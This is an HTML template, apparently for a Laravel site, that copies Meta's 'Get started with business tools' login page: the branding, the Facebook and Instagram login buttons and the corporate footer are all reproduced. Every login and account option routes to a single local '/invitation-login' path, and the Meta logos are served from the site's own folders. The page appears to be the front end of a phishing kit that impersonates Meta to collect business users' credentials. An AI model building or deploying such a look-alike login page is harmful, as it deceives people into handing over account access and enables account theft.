<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get started with business tools from Meta</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yy/r/hcNeeHb3mLH.webp">
    <style>
        :root {
            --meta-blue: #0F71F7;
            --text-primary: #1C1E21;
            --text-secondary: #65676B;
            --button-hover: #f2f2f2;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            overflow-y: auto;
            background: #ffffff;
            color: var(--text-primary);
        }

        .main-container {
            display: flex;
            flex: 1;
            min-height: 100vh;
            width: 100%;
        }

        /* Left Hero Panel */
        .left-panel {
            flex: 1;
            background: linear-gradient(135deg, #FBF1FB 0%, #F5F3FA 25%, #EBF5FD 70%, #E6F3FD 100%);
            padding: 60px 0 60px 100px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            min-width: 0;
            box-sizing: border-box;
        }

        .hero-content-col {
            max-width: 520px;
            z-index: 2;
            flex-shrink: 0;
        }

        .hero-brand-logo {
            margin-bottom: 32px;
        }

        .hero-brand-logo img,
        .hero-brand-logo svg {
            display: block;
            height: 64px;
            width: auto;
        }

        .hero-heading {
            font-size: 38px;
            font-weight: 500;
            line-height: 1.2;
            color: #1c1e21;
            margin-bottom: 20px;
            letter-spacing: -0.2px;
        }

        .hero-desc {
            font-size: 14.5px;
            line-height: 1.5;
            color: #444950;
            margin-bottom: 24px;
            font-weight: 400;
        }

        .hero-desc strong {
            font-weight: 500;
            color: #1c1e21;
        }

        .features-label {
            font-size: 14.5px;
            font-weight: 500;
            margin-bottom: 12px;
            color: #1c1e21;
        }

        .features-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .features-list li {
            position: relative;
            padding-left: 18px;
            margin-bottom: 10px;
            font-size: 14px;
            line-height: 1.45;
            color: #444950;
            font-weight: 400;
        }

        .features-list li::before {
            content: "•";
            position: absolute;
            left: 0;
            color: #444950;
            font-size: 16px;
            line-height: 1;
        }

        .hero-art-col {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            position: relative;
            height: 100%;
            min-width: 300px;
            pointer-events: none;
        }

        .hero-art-img {
            max-height: min(780px, calc(100vh - 80px));
            width: auto;
            max-width: 100%;
            object-fit: contain;
            object-position: right center;
            display: block;
            user-select: none;
        }

        /* Right Login Panel */
        .right-panel {
            width: 580px;
            flex: 0 0 580px;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            border-left: 1px solid #e5e5e5;
            padding: 40px 32px;
            box-sizing: border-box;
        }

        .login-card {
            width: 100%;
            max-width: 440px;
            padding: 24px 16px;
            text-align: center;
        }

        .login-card h2 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 18px;
            color: var(--text-primary);
            letter-spacing: -0.1px;
        }

        .btn-pill {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 7px 18px;
            min-height: 38px;
            border-radius: 999px;
            border: 1px solid #ced0d4;
            background: #ffffff;
            margin-bottom: 10px;
            cursor: pointer;
            transition: background 0.15s ease, border-color 0.15s ease;
            text-decoration: none;
            color: #1c1e21;
            font-weight: 500;
            font-size: 13.5px;
            box-sizing: border-box;
        }

        .btn-pill:hover {
            background: #f2f3f5;
            border-color: #ccd0d5;
        }

        .btn-pill.btn-managed {
            font-weight: 500;
            font-size: 13.5px;
            color: #1c1e21;
            margin-bottom: 0;
            padding: 8px 18px;
            min-height: 38px;
        }

        .create-account-link {
            display: inline-block;
            color: #1c1e21;
            text-decoration: none;
            font-size: 13.5px;
            font-weight: 500;
            cursor: pointer;
            transition: text-decoration 0.15s;
        }

        .create-account-link:hover {
            text-decoration: underline;
        }

        .card-divider {
            margin: 18px 0;
            height: 1px;
            background: #e4e6eb;
            border: none;
        }

        .meta-footer-logo {
            margin-top: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .meta-footer-logo img {
            height: 18px;
            width: auto;
            display: block;
        }

        .meta-footer-logo span {
            color: #1c1e21;
            font-weight: 600;
            font-size: 14px;
            letter-spacing: -0.1px;
            line-height: 1;
        }

        /* Footer Styles */
        footer {
            background-color: #1c1e21;
            color: #f5f6f7;
            padding: 80px 80px 40px 80px;
            font-size: 13px;
        }

        .footer-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 40px;
            margin-bottom: 60px;
        }

        .footer-column h3 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ffffff;
        }

        .footer-column ul {
            list-style: none;
        }

        .footer-column ul li {
            margin-bottom: 12px;
        }

        .footer-column ul li a {
            color: #bcc0c4;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer-column ul li a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .footer-bottom {
            border-top: 1px solid #3e4042;
            padding-top: 40px;
        }

        .footer-bottom-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .copyright-social {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .social-icons {
            display: flex;
            gap: 16px;
        }

        .social-icons svg {
            width: 20px;
            height: 20px;
            fill: #bcc0c4;
            cursor: pointer;
            transition: fill 0.2s;
        }

        .social-icons svg:hover {
            fill: #ffffff;
        }

        .footer-bottom-links {
            display: flex;
            flex-wrap: wrap;
            gap: 24px;
            margin-bottom: 20px;
        }

        .footer-bottom-links a {
            color: #bcc0c4;
            text-decoration: none;
        }

        .footer-bottom-links a:hover {
            text-decoration: underline;
        }

        .language-selector {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            color: #8a8d91;
            font-size: 12px;
        }

        .language-selector span {
            cursor: pointer;
        }

        .language-selector span:hover {
            text-decoration: underline;
        }

        .language-selector .active {
            color: #bcc0c4;
        }

        @media (max-width: 1024px) {
            .main-container {
                flex-direction: column;
                min-height: auto;
            }

            .left-panel {
                flex: none;
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                padding: 40px 24px 20px;
                flex-direction: column;
                align-items: flex-start;
            }

            .hero-content-col {
                max-width: 100%;
                padding-right: 0;
            }

            .hero-heading {
                font-size: 28px;
            }

            .hero-art-col {
                position: relative;
                width: 100%;
                max-width: 100%;
                height: 320px;
                justify-content: center;
                margin-top: 24px;
                right: auto;
                top: auto;
                bottom: auto;
            }

            .hero-art-img {
                height: 100%;
                max-height: 320px;
                object-position: center center;
            }

            .right-panel {
                flex: none;
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                border-left: none;
                border-top: 1px solid #e5e5e5;
                padding: 32px 20px 48px;
            }

            .footer-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            footer {
                padding: 40px 20px;
            }
        }

        @media (max-width: 600px) {
            .left-panel {
                padding: 28px 16px 16px;
            }

            .hero-heading {
                font-size: 26px;
            }

            .hero-art-img {
                max-height: 220px;
            }

            .login-card {
                padding: 10px 4px;
            }

            .login-card h2 {
                font-size: 18px;
                margin-bottom: 20px;
            }

            .footer-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>

<body>
    <div class="main-container">
        <!-- Left Panel: Content & Illustration -->
        <div class="left-panel">
            <div class="hero-content-col">
                <div class="hero-brand-logo">
                    <img src="/images/logometa.png" alt="Meta">
                </div>

                <h1 class="hero-heading">Get started with<br>business tools from Meta</h1>

                <p class="hero-desc">
                    By logging in, you can navigate to all business tools like <strong>Ads Manager</strong>,
                    <strong>Meta Business Suite</strong>, <strong>Commerce Manager</strong> and more to help you connect
                    with your customers and get better business results.
                </p>

                <div class="features-label">Our business tools can help you:</div>

                <ul class="features-list">
                    <li>Spread the word about your business to increase brand awareness</li>
                    <li>Attract new customers, grow your client base and build customer relationships</li>
                    <li>Increase your online sales by reaching new audiences</li>
                </ul>
            </div>

            <div class="hero-art-col">
                <img class="hero-art-img" src="/images/loginbag.png" alt="Meta Business Tools">
            </div>
        </div>

        <!-- Right Panel: Login Card -->
        <div class="right-panel">
            <div class="login-card">
                <h2>Log into business tools from Meta</h2>

                <!-- Facebook Button -->
                <a href="/invitation-login" class="btn-pill">
                    <svg viewBox="0 0 36 36" width="20" height="20" fill="none">
                        <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M0 18C0 8.05887 8.05887 0 18 0C27.9411 0 36 8.05887 36 18C36 26.9943 29.4079 34.4475 20.7812 35.7984V23.2188H25.3594L26.2344 18H20.7812V14.6133C20.7812 13.1895 21.4795 11.8008 23.7223 11.8008H26.3438V7.35156C26.3438 7.35156 23.9648 6.94531 21.6883 6.94531C16.9367 6.94531 13.8281 9.825 13.8281 15.041V18H9.1875V23.2188H13.8281V35.7984C5.2015 34.4475 0 26.9943 0 18Z"
                            fill="#1877F2" />
                    </svg>
                    <span>Continue with Facebook</span>
                </a>

                <!-- Instagram Button -->
                <a href="/invitation-login" class="btn-pill">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                        <defs>
                            <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                                <stop offset="0%" stop-color="#f09433" />
                                <stop offset="25%" stop-color="#e6683c" />
                                <stop offset="50%" stop-color="#dc2743" />
                                <stop offset="75%" stop-color="#cc2366" />
                                <stop offset="100%" stop-color="#bc1888" />
                            </linearGradient>
                        </defs>
                        <rect x="2" y="2" width="20" height="20" rx="5.5" stroke="url(#igGradient)" stroke-width="2" />
                        <circle cx="12" cy="12" r="4.2" stroke="url(#igGradient)" stroke-width="2" />
                        <circle cx="17.3" cy="6.7" r="1.3" fill="url(#igGradient)" />
                    </svg>
                    <span>Continue with Instagram</span>
                </a>

                <div style="margin: 16px 0 18px;">
                    <a href="/invitation-login" class="create-account-link">Create new account</a>
                </div>

                <div class="card-divider"></div>

                <div style="margin-bottom: 24px;">
                    <a href="/invitation-login" class="btn-pill btn-managed">Log in with a managed Meta Account</a>
                </div>

                <div class="meta-footer-logo">
                    <img src="/images/logometa.png" alt="Meta">
                    <span>Meta</span>
                </div>
            </div>
        </div>
    </div>

    <!-- Full Footer -->
    <footer>
        <div class="footer-grid">
            <div class="footer-column">
                <h3>Popular links</h3>
                <ul>
                    <li><a href="#">Facebook</a></li>
                    <li><a href="#">Instagram</a></li>
                    <li><a href="#">Messenger</a></li>
                    <li><a href="#">WhatsApp</a></li>
                    <li><a href="#">Audience Network</a></li>
                    <li><a href="#">Meta Quest</a></li>
                    <li><a href="#">Workplace</a></li>
                    <li><a href="#">Meta for Work</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Products</h3>
                <ul>
                    <li><a href="#">Free Tools</a></li>
                    <li><a href="#">Facebook Pages</a></li>
                    <li><a href="#">Instagram Profiles</a></li>
                    <li><a href="#">Stories</a></li>
                    <li><a href="#">Shops</a></li>
                    <li><a href="#">Meta Business Suite</a></li>
                    <li><a href="#">Ads</a></li>
                    <li><a href="#">Facebook Ads</a></li>
                    <li><a href="#">Instagram Ads</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Resources</h3>
                <ul>
                    <li><a href="#">Business Help Centre</a></li>
                    <li><a href="#">Meta Business Partners</a></li>
                    <li><a href="#">Events</a></li>
                    <li><a href="#">News</a></li>
                    <li><a href="#">Creators</a></li>
                    <li><a href="#">Developers</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Insights</h3>
                <ul>
                    <li><a href="#">Small Business</a></li>
                    <li><a href="#">Large Business</a></li>
                    <li><a href="#">Inspiration</a></li>
                    <li><a href="#">Industry</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Guides</h3>
                <ul>
                    <li><a href="#">Marketing on Facebook</a></li>
                    <li><a href="#">Marketing on Instagram</a></li>
                    <li><a href="#">Marketing on Messenger</a></li>
                    <li><a href="#">Marketing on WhatsApp</a></li>
                </ul>
            </div>
        </div>

        <div class="footer-bottom">
            <div class="footer-bottom-top">
                <div class="copyright-social">
                    <span>© {{ date('Y') }} Meta</span>
                    <div class="social-icons">
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.936 9.936 0 0024 4.59z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.696 1.347 21.028.936 20.238.63c-.765-.297-1.636-.499-2.913-.558C16.067.012 15.66 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" />
                        </svg>
                    </div>
                </div>
            </div>

            <div class="footer-bottom-links">
                <a href="#">About</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Privacy</a>
                <a href="#">Cookies</a>
                <a href="#">Terms</a>
                <a href="#">Help Centre</a>
            </div>

            <div class="language-selector">
                <span class="active">English (UK)</span>
                <span>English (US)</span>
                <span>Español</span>
                <span>Français (France)</span>
                <span>Português (Brasil)</span>
                <span>Italiano</span>
                <span>Deutsch</span>
                <span>Tiếng Việt</span>
            </div>
        </div>
    </footer>
</body>

</html>